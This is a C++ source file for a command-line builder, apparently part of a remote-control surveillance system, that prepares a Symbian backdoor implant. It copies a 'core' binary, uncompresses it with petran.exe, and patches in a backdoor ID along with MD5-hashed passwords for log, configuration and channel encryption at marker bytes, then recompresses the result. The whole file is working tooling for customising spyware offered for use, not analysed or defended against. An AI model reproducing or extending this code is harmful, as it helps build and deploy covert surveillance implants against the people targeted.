
#include "stdafx.h"
#include <Windows.h>
#include <openssl\md5.h>
#include "polymer.h"
#include "fileutils.h"

bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len);
BOOL Compress(TCHAR *wsFile, BOOL flags);

int _tmain(int argc, _TCHAR* argv[])
{
	BYTE *pBlockPtr	= NULL;
	CHAR szBackdoorId[256];
	CHAR szLogPassword[256];
	CHAR szConfPassword[256];
	CHAR szChanPassword[256];
	WCHAR wsCoreFile[MAX_PATH];
	WCHAR wsOutFile[MAX_PATH];
	unsigned int iLen = 0;

	if (argc != 7) {
		printf("ERROR: \n");
		printf("  usage:  RCSSymbianPolymer.exe  <bid> <log_pass> <conf_pass> <chanpass> <core> <output>\n\n");
		printf("  <bid> is the backdoor_id\n");
		printf("  <log_pass> is the password for the log encryption\n");
		printf("  <conf_pass> is the password for the conf encryption\n");
		printf("  <chanpass> is the password for the channel encryption\n");
		printf("  <core> is the core to be polymerized\n");
		printf("  <output> is the output file\n\n");
		return 0;
	}

	sprintf_s(szBackdoorId, sizeof(szBackdoorId), "%S", argv[1]);
	sprintf_s(szLogPassword, sizeof(szLogPassword), "%S", argv[2]);
	sprintf_s(szConfPassword, sizeof(szConfPassword), "%S", argv[3]);
	sprintf_s(szChanPassword, sizeof(szChanPassword), "%S", argv[4]);
	wsprintf(wsCoreFile, L"%s", argv[5]);
	wsprintf(wsOutFile, L"%s", argv[6]);

	/************************************************************************/
	/*  SANITY CHECKS                                                       */
	/************************************************************************/
	if (strlen(szBackdoorId) < strlen("RCS_0000000000")) {
		printf("Backdoor_id should be at least %d characters\n", strlen("RCS_0000000000"));
		return ERROR_EMBEDDING;
	}

	if (strlen(szLogPassword) < AES_PASS_LEN) {
		printf("Log Password should be at least %d characters\n", AES_PASS_LEN);
		return ERROR_EMBEDDING;
	}

	if (strlen(szConfPassword) < AES_PASS_LEN) {
		printf("Conf Password should be at least %d characters\n", AES_PASS_LEN);
		return ERROR_EMBEDDING;
	}

	if (strlen(szChanPassword) < CHAN_PASS_LEN) {
		printf("Channel password should be at least %d characters\n", CHAN_PASS_LEN);
		return ERROR_EMBEDDING;
	}

	/************************************************************************/
	/*  READY TO GO                                                         */
	/************************************************************************/

	printf("Ready to go...\n");
	printf("BACKDOOR_ID   [%s]\n", szBackdoorId);
	printf("LOG PASSWORD  [%s]\n", szLogPassword);
	printf("CONF PASSWORD [%s]\n", szConfPassword);
	printf("CHAN PASSWORD [%s]\n", szChanPassword);
	printf("INPUT CORE    [%S]\n", wsCoreFile);
	printf("OUTPUT FILE   [%S]\n\n", wsOutFile);

	if (CopyFile(wsCoreFile, wsOutFile, FALSE) == FALSE) {
		printf("Cannot create output file[%S]\n", wsOutFile);
		return ERROR_OUTPUT;
	}

	/************************************************************************/
	/* UNCOMPRESS                                                           */
	/************************************************************************/

	if (Compress(wsOutFile, FALSE))
		printf("Uncompressing the core... ok\n");
	else {
		printf("Cannot uncompress file [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	/************************************************************************/
	/* BINARY PATCHING                                                      */
	/************************************************************************/

	BYTE bufmd5[MD5_DIGEST_LENGTH];

	pBlockPtr = (BYTE *) LoadFile(wsOutFile, &iLen);

	// Patching Passwod dei log
	MD5((const UCHAR *)szLogPassword, strlen(szLogPassword) , (PUCHAR) bufmd5);
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) bufmd5, AES_PASS_LEN, AES_LOG_PASS_MARK, AES_PASS_MARK_LEN))
		printf("Password embedded... ok\n");
	else {
		printf("Cannot embed Log Password [%S]\n", wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching Passwod della conf
	MD5((const UCHAR *)szConfPassword, strlen(szConfPassword) , (PUCHAR) bufmd5);
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) bufmd5, AES_PASS_LEN, AES_CONF_PASS_MARK, AES_PASS_MARK_LEN))
		printf("Password embedded... ok\n");
	else {
		printf("Cannot embed Conf Password [%S]\n", wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching Passwod del protocollo
	MD5((const UCHAR *)szChanPassword, strlen(szChanPassword) , (PUCHAR) bufmd5);
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) bufmd5, CHAN_PASS_LEN, CHAN_PASS_MARK, CHAN_PASS_MARK_LEN))
		printf("Channel Password embedded... ok\n");
	else {
		printf("Cannot embed Channel Password [%S]\n", wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching  backdoor ID
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) szBackdoorId, BACKDOOR_ID_LEN, BACKDOOR_ID_MARK, BACKDOOR_ID_LEN))
		printf("Backdoor_id embedded... ok\n");
	else {
		printf("Cannot embed Backdoor_id [%S]\n", wsOutFile);
		return ERROR_EMBEDDING;
	}

	UnloadFile(pBlockPtr);

	/************************************************************************/
	/* COMPRESS                                                             */
	/************************************************************************/

	if (Compress(wsOutFile, TRUE))
		printf("Compressing the core... ok\n");
	else {
		printf("Cannot compress file [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	printf("Output file... ok\n");


	return ERROR_SUCCESS;
}


bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len)
{
	BYTE *pDataSect	= NULL;
	bool iRet = false;

	pDataSect = pBlockPtr;

	if( pBlockPtr == NULL )
		return false;

	__try {
		while(  pBlockPtr < (pDataSect + iLen) ) {

			if( !memcmp(pBlockPtr,mark_b, mark_len) )
				break;
			else
				pBlockPtr++;
		}
	} __except (GetExceptionCode() == EXCEPTION_ACCESS_VIOLATION ) {
		pBlockPtr = NULL;
	}

	if( pBlockPtr  && (pBlockPtr < ( pDataSect + iLen - 1 ) )   ) {

		memset(pBlockPtr, 0, (int)mark_len);
		memcpy(pBlockPtr, block, (int)block_len);

		iRet = true;

	} else 
		iRet = false;

	return iRet;
}

BOOL Compress(TCHAR *wsFile, BOOL flags)
{
	char				szComm[2048];
	STARTUPINFOA		start_Info;
	PROCESS_INFORMATION proc_Info;
	SECURITY_ATTRIBUTES sSec_attrib;
	DWORD				dwRetCode, dwRet;
	BOOL				bRet = FALSE;

	if (wsFile == NULL)
		return FALSE;

	ZeroMemory(szComm, sizeof(szComm));	
	ZeroMemory(&start_Info,  sizeof(start_Info));
	ZeroMemory(&proc_Info,   sizeof(proc_Info));
	ZeroMemory(&sSec_attrib, sizeof(sSec_attrib));

	sSec_attrib.bInheritHandle = true;
	sSec_attrib.nLength = sizeof(sSec_attrib);

	start_Info.cb = sizeof(start_Info);
	start_Info.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	start_Info.wShowWindow = SW_HIDE;

	if (flags)
		sprintf_s(szComm, sizeof(szComm), "\"petran.exe\" -compress %S", wsFile);
	else
		sprintf_s(szComm, sizeof(szComm), "\"petran.exe\" -nocompress %S", wsFile);

	if ((bRet = CreateProcessA(NULL, szComm, 0, 0, true, 0, 0, 0, &start_Info, &proc_Info)) == false)
		return bRet;

	if( proc_Info.hProcess != INVALID_HANDLE_VALUE ) {
		dwRet = WaitForSingleObject(proc_Info.hProcess, 600000);
		GetExitCodeProcess(proc_Info.hProcess, &dwRetCode);
	}

	if( !bRet || dwRet == WAIT_TIMEOUT || dwRetCode != 0 ) { 
		DWORD ret = GetLastError();
		return false;
	} 

	return true;
}
